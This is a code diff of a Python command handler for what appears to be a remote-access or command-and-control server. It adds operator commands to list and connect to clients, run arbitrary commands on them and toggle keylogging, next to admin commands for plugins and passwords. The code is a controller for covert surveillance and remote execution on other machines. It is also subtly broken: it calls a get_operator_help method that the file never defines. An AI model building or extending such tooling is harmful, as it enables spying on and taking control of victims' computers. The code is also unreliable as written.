@@ -1,137 +1,97 @@
 import logging
 
+
 class CommandHandler:
     """
-    Handles the parsing and execution of commands.
+    Handles parsing and execution of both administrative and operator commands.
     """
 
-    def __init__(self, main_server):
-        """
-        Initializes the CommandHandler.
-
-        Args:
-            main_server: The main server instance.
-        """
+    def __init__(self, admin_server, operator_shell, main_server):
+        self.admin_server = admin_server
+        self.operator_shell = operator_shell
         self.main_server = main_server
-        self.commands = {
-            "help": self.get_help,
-            "status": self.show_status,
-            "enable": self.enable_plugin,
-            "disable": self.disable_plugin,
-            "list": self.list_active_clients,
-            "exit": self.exit_shell,
-        }
 
-    def handle_command(self, command):
+    def handle(self, command: str, context: str = "admin"):
         """
-        Parses and executes a command.
+        Dispatches commands based on the context (admin or operator).
 
         Args:
-            command (str): The command string.
+            command (str): The command string to execute.
+            context (str): The context of the command ('admin' or 'operator').
 
         Returns:
-            str: The result of the command.
+            str: Result of the executed command or an error message.
         """
-        parts = command.strip().split()
+        parts = command.split()
         if not parts:
-            return "Invalid command."
+            return "Invalid command. Type 'help' for a list of commands."
 
-        cmd = parts[0].lower()
-        if cmd in self.commands:
-            return self.commands[cmd](parts[1:])  # Pass arguments to the handler
+        cmd_name = parts[0].lower()
+
+        if context == "admin":
+            return self.handle_admin_command(cmd_name, parts)
+        elif context == "operator":
+            return self.handle_operator_command(cmd_name, parts)
         else:
-            return f"Unknown command: {cmd}"
+            logging.error(f"[CommandHandler] Unknown context: {context}")
+            return f"Unknown context: {context}. Type 'help' for assistance."
 
-    def get_help(self, args=None):
+    def handle_admin_command(self, cmd_name: str, parts: list):
         """
-        Returns the help message.
+        Handles administrative commands.
 
         Args:
-            args (list): Command arguments (unused).
+            cmd_name (str): The command name.
+            parts (list): The command arguments.
 
         Returns:
-            str: Help message.
+            str: Result of the executed command or an error message.
         """
-        return (
-            "Available Commands:\n"
-            "  help               - Show this help message.\n"
-            "  status             - Show server status.\n"
-            "  enable <plugin>    - Enable a plugin.\n"
-            "  disable <plugin>   - Disable a plugin.\n"
-            "  list               - List active client connections.\n"
-            "  exit               - Exit the shell or client session.\n"
-        )
+        if cmd_name == "status":
+            return self.admin_server.show_status()
+        elif cmd_name == "enable" and len(parts) == 2:
+            return self.admin_server.enable_plugin(parts[1])
+        elif cmd_name == "disable" and len(parts) == 2:
+            return self.admin_server.disable_plugin(parts[1])
+        elif cmd_name == "list" and len(parts) == 2 and parts[1] == "plugins":
+            return self.admin_server.list_plugins()
+        elif cmd_name == "change" and len(parts) == 3 and parts[1] == "pass":
+            return self.admin_server.change_password(parts[2])
+        elif cmd_name == "exit":
+            return self.exit_server()
+        else:
+            return f"Unknown admin command: {cmd_name}. Type 'help' for assistance."
 
-    def show_status(self, args=None):
+    def handle_operator_command(self, cmd_name: str, parts: list):
         """
-        Displays the server's current status.
+        Handles operator-specific commands.
 
         Args:
-            args (list): Command arguments (unused).
+            cmd_name (str): The command name.
+            parts (list): The command arguments.
 
         Returns:
-            str: Status message.
+            str: Result of the executed command or an error message.
         """
-        return self.main_server.show_status()
+        if cmd_name == "help":
+            return self.get_operator_help()
+        elif cmd_name == "list":
+            return self.operator_shell.list_clients()
+        elif cmd_name == "connect" and len(parts) == 2:
+            return self.operator_shell.connect_client(parts[1])
+        elif cmd_name == "run" and len(parts) > 1:
+            return self.operator_shell.run_command(" ".join(parts[1:]))
+        elif cmd_name == "keylogging" and len(parts) == 2:
+            return self.operator_shell.handle_keylogging(parts[1])
+        elif cmd_name == "exit":
+            return self.exit_server()
+        else:
+            return f"Unknown operator command: {cmd_name}. Type 'help' for assistance."
 
-    def enable_plugin(self, args):
+    def exit_server(self):
         """
-        Enables a plugin.
-
-        Args:
-            args (list): Command arguments.
-
-        Returns:
-            str: Result message.
+        Gracefully shuts down the server.
         """
-        if not args:
-            return "Usage: enable <plugin>"
-        plugin = args[0]
-        if self.main_server.enable_plugin(plugin):
-            return f"Plugin '{plugin}' enabled."
-        return f"Failed to enable plugin '{plugin}'."
-
-    def disable_plugin(self, args):
-        """
-        Disables a plugin.
-
-        Args:
-            args (list): Command arguments.
-
-        Returns:
-            str: Result message.
-        """
-        if not args:
-            return "Usage: disable <plugin>"
-        plugin = args[0]
-        if self.main_server.disable_plugin(plugin):
-            return f"Plugin '{plugin}' disabled."
-        return f"Failed to disable plugin '{plugin}'."
-
-    def list_active_clients(self, args=None):
-        """
-        Lists all active client connections.
-
-        Args:
-            args (list): Command arguments (unused).
-
-        Returns:
-            str: List of active clients.
-        """
-        active_clients = self.main_server.client_management.list_active_clients()
-        if not active_clients:
-            return "No active clients."
-        return f"Active Clients: {', '.join(map(str, active_clients))}"
-
-    def exit_shell(self, args=None):
-        """
-        Exits the shell or client session.
-
-        Args:
-            args (list): Command arguments (unused).
-
-        Returns:
-            str: Exit message.
-        """
-        self.main_server.operator_session.running_shell = False
-        return "Exiting shell."
+        logging.info("[CommandHandler] Shutting down server.")
+        self.main_server.shutdown()  # Assuming main_server has a shutdown method
+        return "Server shutting down..."
